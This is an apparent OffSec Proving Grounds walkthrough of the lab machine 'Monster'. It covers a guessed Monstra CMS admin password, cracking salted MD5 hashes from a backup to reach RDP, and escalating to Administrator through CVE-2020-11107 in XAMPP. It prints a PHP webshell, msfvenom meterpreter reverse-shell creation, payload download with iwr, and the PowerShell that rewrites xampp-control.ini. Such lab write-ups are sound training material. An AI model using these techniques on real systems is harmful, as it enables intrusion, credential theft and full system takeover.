## Summary

In this guide, we will gain a foothold on the target system by leveraging a weak password to access a CMS Admin panel. From there, we access the CMS backup system where we find crackable password hashes leading to low privilege access. We will then elevate to the Administrator account by manipulating writable XAMPP configuration files.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 192.168.120.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-22 12:13 EST
Nmap scan report for monster.pg (192.168.120.156)
Host is up (0.032s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mike Wazowski
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
443/tcp  open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-title: Mike Wazowski
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2022-02-22T17:14:12+00:00
|_ssl-date: 2022-02-22T17:14:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Mike-PC
| Not valid before: 2022-02-21T06:47:51
|_Not valid after:  2022-08-23T06:47:51
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We find web servers running on ports 80 and 443 as well as RDP on port 3389.

### Webserver Enumeration

Let's start by taking a look at the web server on port 80. Opening http://192.168.120.156 in a browser, we find a static webpage containing the name "Mike Wazowski".

![Static Webpage](https://static.offsec.com/walkthroughs-images/PG_Practice_98_image_1_5QOkb8uh.png)

Static Webpage

Let's run `ffuf` to see if we can find any other endpoints on this webserver.

```
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://192.168.120.156/FUZZ -t 500 -fc 403,404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.120.156/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 500
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403,404
________________________________________________

                        [Status: 200, Size: 22916, Words: 8056, Lines: 540]
blog                    [Status: 301, Size: 342, Words: 22, Lines: 10]
Blog                    [Status: 301, Size: 342, Words: 22, Lines: 10]
index.html              [Status: 200, Size: 22916, Words: 8056, Lines: 540]
assets                  [Status: 301, Size: 344, Words: 22, Lines: 10]
:: Progress: [4614/4614] :: Job [1/1] :: 330 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

We find that there is a **/blog** endpoint. We open it in the browser, but the webpage doesn't appear to load correctly. If we open the Developer Console by pressing **CTR+Shift+I** and reload the page, we find a failed request for a javascript file using the domain `monster.pg`.

![Developer Console](https://static.offsec.com/walkthroughs-images/PG_Practice_98_image_2_4s2SeEv1.png)

Developer Console

Let's add this domain to our **/etc/hosts** file.

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts                   
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.120.156 monster.pg
```

Now, let's reload the blog page. This time it looks more like it was intended. We also discover that it is running Monstra CMS version 3.0.4.

![Powered by Monstra 3.0.4](https://static.offsec.com/walkthroughs-images/PG_Practice_98_image_3_j5oozOEu.png)

Powered by Monstra 3.0.4

We can check for exploits in ExploitDB by using `searchsploit`. Let's update and search for `Monstra 3.0.4`.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -u
...
┌──(kali㉿kali)-[~]
└─$ searchsploit Monstra 3.0.4
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution | php/webapps/43348.txt
Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                     | php/webapps/44512.txt
Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                           | php/webapps/48479.txt
Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                | php/webapps/44502.txt
Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                         | php/webapps/49949.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                    | php/webapps/44855.py
Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                    | php/webapps/44646.txt
Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                | php/webapps/45164.txt
---------------------------------------------------------------------------------- ---------------------------------
```

There are a few entries that may be useful for us but require authentication.

## Exploitation

The Monstra admin login can be found at **/admin**. We attempt a few common passwords before discovering that the password for the `admin` user is `wazowski` from the name we found on the static page. After submitting those credentials, we are redirected to the admin dashboard.

Now that we have authenticated access, let's grab a copy of that Authenticated Remote Code Execution python script on ExploitDB.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 49949.py         
  Exploit: Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49949
     Path: /usr/share/exploitdb/exploits/php/webapps/49949.py
File Type: ASCII text, with very long lines (18247)

Copied to: /home/kali/49949.py
```

Looking over the script, we find that it abuses the fact that the filter for uploaded files doesn't check for **.pht** or **.phar** extensions. Let's give it a shot.

```
┌──(kali㉿kali)-[~]
└─$ python3 49949.py -T monster.pg -P 80 -U /blog/ -u admin -p wazowski

Please login in your webrowser and then open the following URL:
File uploaded to: http://monster.pg:80/blog/public/uplaods/shell.phar
```

When we open the link in the script output, we find an "error404" page. This doesn't seem to work. Let's try another option from the `searchsploit` output. Maybe the "(Authenticated) Arbitrary File Upload / Remote Code Execution" one will help us out.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -x 43348
...
MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a
remote command execution on the remote server.
...
Proof of Concept
Steps to Reproduce:

1. Login with a valid credentials of an Editor
2. Select Files option from the Drop-down menu of Content
3. Upload a file with PHP (uppercase)extension containing the below code: (EDB Note: You can also use .php7)

           <?php

 $cmd=$_GET['cmd'];

 system($cmd);

 ?>

4. Click on Upload
5. Once the file is uploaded Click on the uploaded file and add ?cmd= to
the URL followed by a system command such as whoami,time,date etc.
```

This seems like manual steps to upload a PHP webshell. If we follow those steps and attempt to upload a file with a **.PHP** extension, we receive an error simply stating the file was not uploaded. We receive the same error if we change the extension to **.php7**, **.pht**, and **.phar**. Even a **.txt** file fails to upload. Perhaps this upload directory is not writeable.

As the admin, we appear to have access to the backup management page at http://monster.pg/blog/admin/index.php?id=backup. Clicking the "Create Backup" button causes a new backup entry to be added after a few seconds.

![Creating a Backup](https://static.offsec.com/walkthroughs-images/PG_Practice_98_image_4_7TocWN8u.png)

Creating a Backup

Clicking the new backup entry allows us to download it as a zip file to our Kali host. Let's move it into our working directory and extract it.

```
┌──(kali㉿kali)-[~]
└─$ mv ~/Downloads/2022-02-24-03-08-59.zip ~ 
                                                                                                            
┌──(kali㉿kali)-[~]
└─$ unzip 2022-02-24-03-08-59.zip
...
```

This creates a new directory in our home folder named **C:**. Let's see if we can quickly find something useful by grepping for the word "password".

```
┌──(kali㉿kali)-[~]
└─$ grep -Rl password C:
C:/xampp/htdocs/blog/storage/database/users.table.xml
C:/xampp/htdocs/blog/storage/emails/reset-password.email.php
C:/xampp/htdocs/blog/storage/emails/new-password.email.php
C:/xampp/htdocs/blog/plugins/codemirror/LICENSE
C:/xampp/htdocs/blog/plugins/codemirror/codemirror/mode/sql/sql.js
C:/xampp/htdocs/blog/plugins/codemirror/codemirror/mode/nginx/index.html
C:/xampp/htdocs/blog/plugins/codemirror/codemirror/addon/hint/html-hint.js
C:/xampp/htdocs/blog/public/assets/css/bootstrap.css.map
C:/xampp/htdocs/blog/public/assets/js/jquery-2.1.0.min.map
C:/xampp/htdocs/blog/public/assets/js/jquery.min.js
C:/xampp/htdocs/blog/public/themes/default/header.chunk.php
```

The first file listed in the grep output looks interesting. Let's take a look at it using `xmllint`.

```
┌──(kali㉿kali)-[~]
└─$ xmllint --format C:/xampp/htdocs/blog/storage/database/users.table.xml 
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <options>
    <autoincrement>2</autoincrement>
  </options>
  <fields>
    <login/>
    <password/>
    <email/>
    <role/>
    <date_registered/>
    <firstname/>
    <lastname/>
    <login/>
    <twitter/>
    <skype/>
    <hash/>
    <about_me/>
  </fields>
  <users>
    <id>1</id>
    <uid>de58425259</uid>
    <firstname/>
    <lastname/>
    <twitter/>
    <skype/>
    <about_me/>
    <login>admin</login>
    <password>a2b4e80cd640aaa6e417febe095dcbfc</password>
    <email>wazowski@monster.pg</email>
    <hash>jJkdUX1FOFiI</hash>
    <date_registered>1645512776</date_registered>
    <role>admin</role>
  </users>
  <users>
    <id>2</id>
    <uid>800c7d9797</uid>
    <firstname/>
    <lastname/>
    <twitter/>
    <skype/>
    <about_me/>
    <login>mike</login>
    <password>844ffc2c7150b93c4133a6ff2e1a2dba</password>
    <email>mike@monster.pg</email>
    <hash>8vPjvUPDHhRp</hash>
    <date_registered>1645512909</date_registered>
    <role>user</role>
  </users>
</root>
```

We find entries for the admin and mike users including password hashes. Though, we don't know what type of hashes these are. Let's see if `hash-identifier` can help us.

```
┌──(kali㉿kali)-[~]
└─$ hash-identifier       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: a2b4e80cd640aaa6e417febe095dcbfc

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
```

We don't receive a clear answer but it looks like it's probably some hashing combination involving MD5. We can use the tool `mdxfind` to help us determine how these password hashes were created. We can download a binary from [here](https://www.techsolvency.com/pub/bin/mdxfind/).

```
┌──(kali㉿kali)-[~]
└─$ wget https://www.techsolvency.com/pub/bin/mdxfind/mdxfind.static -O mdxfind

┌──(kali㉿kali)-[~]
└─$ chmod +x mdxfind 
```

Before we can run `mdxfind`, we will need to figure out the salt value used by Monstra CMS and we will need a hash that we know what the original password was. After some web searching, we find [this blog](https://simpleinfoseccom.wordpress.com/2018/05/27/monstra-cms-3-0-4-unauthenticated-user-credential-exposure/) which claims that the salt can very likely be the default value of "YOUR_SALT_HERE". Let's write this to a file for use later.

```
┌──(kali㉿kali)-[~]
└─$ echo "YOUR_SALT_HERE" > salt.txt
```

As for the known hash, we can simply use the hash of the admin user because we know the password is "wazkowski". Let's create a password file with only that password for `mdxfind` to use.

```
┌──(kali㉿kali)-[~]
└─$ echo "wazkowski" > pass.txt 
```

We now need to pass the admin password hash into `mdxfind` using stdin and specify MD5 hashing, our salt and pass files, and we can attempt to try 5 iterations.

```
┌──(kali㉿kali)-[~]
└─$ echo "a2b4e80cd640aaa6e417febe095dcbfc" | ./mdxfind -h 'MD5' -s salt.txt pass.txt -i 5
1 salts read from salt.txt
Iterations set to 5
...
1 total salts in use
Generated 19998 Userids
Reading hash list from stdin...
Took 0.00 seconds to read hashes
Searching through 1 unique hashes from <STDIN>
Maximum hash chain depth is 1
Minimum hash length is 32 characters
Using 4 cores
MD5PASSSALTx02 a2b4e80cd640aaa6e417febe095dcbfc:YOUR_SALT_HERE:wazowski

Done - 4 threads caught
1 lines processed in 0 seconds
1.00 lines per second
0.10 seconds hashing, 2,027,998 total hash calculations
20.33M hashes per second (approx)
1 total files
1 MD5PASSSALTx02 hashes found
1 Total hashes found
```

The command completes quickly and we now know that these hashes are created with 2 rounds of MD5 with our assumed salt value of "YOUR_SALT_HERE". With this information, we can now use `mdxfind` again to attempt to crack the password hash for the "mike" user. Let's run the same command but swap in mike's hash, specify the hash type, supply the rockyou wordlist, and switch it to 2 iterations.

```
┌──(kali㉿kali)-[~]
└─$ echo "844ffc2c7150b93c4133a6ff2e1a2dba" | ./mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/sharewordlists/rockyou.txt -i 2
1 salts read from salt.txt
Iterations set to 2
Working on hash types: MD5PASSSALT SHA1revMD5PASSSALT SHA1MD5PASSSALT MD5-SALTMD5PASSSALT 
1 total salts in use
Reading hash list from stdin...
Took 0.00 seconds to read hashes
Searching through 1 unique hashes from <STDIN>
Maximum hash chain depth is 1
Minimum hash length is 32 characters
Using 4 cores
MD5PASSSALTx02 844ffc2c7150b93c4133a6ff2e1a2dba:YOUR_SALT_HERE:Mike14

Done - 4 threads caught
14,344,392 lines processed in 6 seconds
2390732.00 lines per second
5.83 seconds hashing, 143,443,920 total hash calculations
24.59M hashes per second (approx)
1 total files
1 MD5PASSSALTx02 hashes found
1 Total hashes found
```

We have cracked mike's password. Maybe Mike uses the same password for RDP. Let's give it a shot.

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /cert-ignore /u:mike /p:Mike14 /v:192.168.120.156 

```

![RDP Access](https://static.offsec.com/walkthroughs-images/PG_Practice_98_image_7_Znvw2Jwe.png)

RDP Access

We have successfully achieved RDP access to the target as the mike user!

## Escalation

We open PowerShell to take a quick look around and discover XAMPP running out of **C:\xampp**. Within that directory, we find **properties.ini**.

```
PS C:\Users\Mike> ls C:\xampp\


    Directory: C:\xampp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
...
-a----         2/21/2022  10:43 PM            792 properties.ini
...
PS C:\Users\Mike> type C:\xampp\properties.ini
[General]
installdir=C:\xampp
base_stack_name=XAMPP
base_stack_key=
base_stack_version=7.3.10-1
base_stack_platform=windows-x64
[Apache]
apache_server_port=80
apache_server_ssl_port=443
apache_root_directory=/xampp/apache
apache_htdocs_directory=C:\xampp/htdocs
apache_domainname=127.0.0.1
apache_configuration_directory=C:\xampp/apache/conf
apache_unique_service_name=
[MySQL]
mysql_port=3306
mysql_host=localhost
mysql_root_directory=C:\xampp\mysql
mysql_binary_directory=C:\xampp\mysql\bin
mysql_data_directory=C:\xampp\mysql\data
mysql_configuration_directory=C:\xampp/mysql/bin
mysql_arguments=-u root -P 3306
mysql_unique_service_name=
[PHP]
php_binary_directory=C:\xampp\php
php_configuration_directory=C:\xampp\php
php_extensions_directory=C:\xampp\php\ext
PS C:\Users\Mike>
```

This file tells us that it is running XAMPP version 7.3.10-1. Let's see if there is anything useful in ExploitDB.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit XAMPP 7.3.10-1
Exploits: No Results
Shellcodes: No Results
Papers: No Results
```

We don't find anything specific to this version, but maybe we will find something if we search without the version.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit XAMPP  
------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                           |  Path
------------------------------------------------------------------------- ---------------------------------
XAMPP - 'Phonebook.php' Multiple Remote HTML Injection Vulnerabilities   | multiple/remote/25391.txt
XAMPP - Insecure Default Password Disclosure                             | multiple/dos/25393.txt
XAMPP - WebDAV PHP Upload (Metasploit)                                   | windows/remote/18367.rb
XAMPP 1.6.8 - Cross-Site Request Forgery (Change Administrative Password | windows/remote/7384.txt
XAMPP 1.6.x - 'showcode.php' Local File Inclusion                        | multiple/webapps/33578.txt
XAMPP 1.6.x - Multiple Cross-Site Scripting Vulnerabilities              | multiple/remote/33577.txt
XAMPP 1.7.2 - Change Administrative Password                             | php/webapps/10391.txt
XAMPP 1.7.3 - Multiple Vulnerabilities                                   | php/webapps/15370.txt
XAMPP 1.7.4 - Cross-Site Scripting                                       | windows/remote/36258.txt
XAMPP 1.7.7 - 'PHP_SELF' Multiple Cross-Site Scripting Vulnerabilities   | windows/remote/36291.txt
XAMPP 1.8.1 - 'lang.php?WriteIntoLocalDisk method' Local Write Access    | php/webapps/28654.txt
XAMPP 3.2.1 & phpMyAdmin 4.1.6 - Multiple Vulnerabilities                | php/webapps/32721.txt
XAMPP 5.6.8 - SQL Injection / Persistent Cross-Site Scripting            | php/webapps/46424.html
XAMPP 7.4.3 - Local Privilege Escalation                                 | windows/local/50337.ps1
XAMPP Control Panel - Denial Of Service                                  | windows/dos/40964.py
XAMPP Control Panel 3.2.2 - Buffer Overflow (SEH) (Unicode)              | windows/local/45828.py
XAMPP Control Panel 3.2.2 - Denial of Service (PoC)                      | windows_x86/dos/45419.py
XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow      | windows/remote/3738.php
XAMPP for Windows 1.6.3a - Local Privilege Escalation                    | windows/local/4325.php
XAMPP for Windows 1.6.8 - 'cds.php' SQL Injection                        | windows/remote/32457.txt
XAMPP for Windows 1.6.8 - 'Phonebook.php' SQL Injection                  | windows/remote/32460.txt
XAMPP for Windows 1.7.7 - Multiple Cross-Site Scripting / SQL Injections | windows/remote/37396.txt
XAMPP for Windows 1.8.2 - Blind SQL Injection                            | windows/webapps/29292.txt
XAMPP Linux 1.6 - 'iart.php?text' Cross-Site Scripting                   | linux/remote/32166.txt
XAMPP Linux 1.6 - 'ming.php?text' Cross-Site Scripting                   | linux/remote/32165.txt
------------------------------------------------------------------------- ---------------------------------
```

Most of there don't look very useful but there is one for XAMPP version 7.4.3 that appears to be a local privlege escalation. Let's take a look at it.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -x 50337 
# Exploit Title: XAMPP 7.4.3 - Local Privilege Escalation
# Exploit Author: Salman Asad (@LeoBreaker1411 / deathflash1411)
# Original Author: Maximilian Barz (@S1lkys)
# Date: 27/09/2021
# Vendor Homepage: https://www.apachefriends.org
# Version: XAMPP < 7.2.29, 7.3.x < 7.3.16 & 7.4.x < 7.4.4
# Tested on: Windows 10 + XAMPP 7.3.10
# References: https://github.com/S1lkys/CVE-2020-11107

$file = "C:\xampp\xampp-control.ini"
$find = ((Get-Content $file)[2] -Split "=")[1]
# Insert your payload path here
$replace = "C:\temp\msf.exe"
(Get-Content $file) -replace $find, $replace | Set-Content $file
```

This looks like a simple script to replace some text in **xampp-control.ini** with a path to a payload. Let's give this a shot. We can use `msfvenom` to create a reverse shell payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.118.14 lport=1411 -f exe -o msf.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: msf.exe
```

Let's host this payload using a python webserver.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

From our RDP session, let's download the payload to Mike's **Downloads** folder.

```
PS C:\Users\Mike> iwr http://192.168.118.14/msf.exe -OutFile C:\Users\Mike\Downloads\msf.exe
```

Then, we start a listener to catch the reverse shell connection.

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 192.168.118.14
lhost => 192.168.118.14
msf6 exploit(multi/handler) > set lport 1411
lport => 1411
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.118.14:1411 
```

Next, let's use the commands in the script from ExploitDB to modify the **xampp-control.ini** file.

```
PS C:\Users\Mike> $file = "C:\xampp\xampp-control.ini"
PS C:\Users\Mike> $find = ((Get-Content $file)[2] -Split "=")[1]
PS C:\Users\Mike> $replace = "C:\Users\Mike\Downloads\msf.exe"
PS C:\Users\Mike> (Get-Content $file) -replace $find, $replace | Set-Content $file
PS C:\Users\Mike>
```

The next time the Administrator attempts to edit XAMPP settings, our payload will be triggered. After a few minets, we recieve a connection to our listener.

```
[*] Sending stage (175174 bytes) to 192.168.120.156
[*] Meterpreter session 1 opened (192.168.118.14:1411 -> 192.168.120.156:50624 ) at 2022-02-24 15:10:35 -0500

meterpreter > getuid
Server username: MIKE-PC\Administrator
meterpreter > 
```

We have successfully achieved Administrator access on the target system!